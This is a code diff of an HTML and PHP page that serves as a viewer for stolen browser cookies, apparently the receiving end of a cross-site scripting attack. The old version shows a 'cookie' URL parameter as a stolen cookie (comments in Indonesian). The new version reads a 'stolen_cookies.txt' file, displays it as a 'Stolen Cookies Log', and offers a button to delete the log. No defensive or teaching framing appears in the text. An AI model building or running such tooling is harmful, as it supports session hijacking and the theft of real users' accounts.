@@ -1,28 +1,52 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Logging Server</title>
+    <title>Stolen Cookies Log Viewer</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 2em; }
+        .container { max-width: 800px; margin: auto; }
+        pre { background: #f4f4f4; padding: 1em; border: 1px solid #ddd; white-space: pre-wrap; }
+        .log-entry { margin-bottom: 1em; padding: 1em; border-bottom: 1px solid #ccc; }
+        .delete-form { margin-top: 1em; }
+        .btn { padding: 10px 15px; background-color: #dc3545; color: white; border: none; cursor: pointer; }
+        .btn:hover { background-color: #c82333; }
+    </style>
 </head>
 <body>
-    <h1>Logging Server</h1>
-    <p>Data cookies yang dicuri akan muncul di sini atau di log server.</p>
-    <div id="cookies"></div>
+    <div class="container">
+        <h1>Stolen Cookies Log</h1>
+        
+        <?php
+            $logFile = 'stolen_cookies.txt';
+            $deleteAction = false;
 
-    <script>
-        // Ambil parameter 'cookie' dari URL
-        const urlParams = new URLSearchParams(window.location.search);
-        const stolenCookie = urlParams.get('cookie');
+            // Handle delete request
+            if (isset($_POST['delete'])) {
+                if (file_exists($logFile)) {
+                    unlink($logFile); // Delete the file
+                    $deleteAction = true;
+                    echo '<p style="color: green;">Log file has been deleted.</p>';
+                } else {
+                    echo '<p style="color: red;">Log file does not exist.</p>';
+                }
+            }
+        ?>
 
-        // Jika ada cookie yang dicuri, tampilkan di halaman
-        if (stolenCookie) {
-            document.getElementById('cookies').innerHTML = `
-                <h2>Cookie yang Dicuri:</h2>
-                <p>${stolenCookie}</p>
-            `;
-            // Di sini Anda juga bisa mengirimkan data ke server lain jika perlu
-        } else {
-            document.getElementById('cookies').innerHTML = `<p>Tidak ada cookie yang ditemukan.</p>`;
-        }
-    </script>
+        <h2>Log Entries:</h2>
+        <?php
+            if (file_exists($logFile) && filesize($logFile) > 0) {
+                $fileContent = file_get_contents($logFile);
+                echo '<pre>' . htmlspecialchars($fileContent) . '</pre>';
+            } elseif (!$deleteAction) {
+                echo '<p>No cookies have been logged yet.</p>';
+            }
+        ?>
+        
+        <form method="post" class="delete-form">
+            <button type="submit" name="delete" class="btn" onclick="return confirm('Are you sure you want to delete the log file? This action is irreversible.');">
+                Delete Log File
+            </button>
+        </form>
+    </div>
 </body>
 </html>
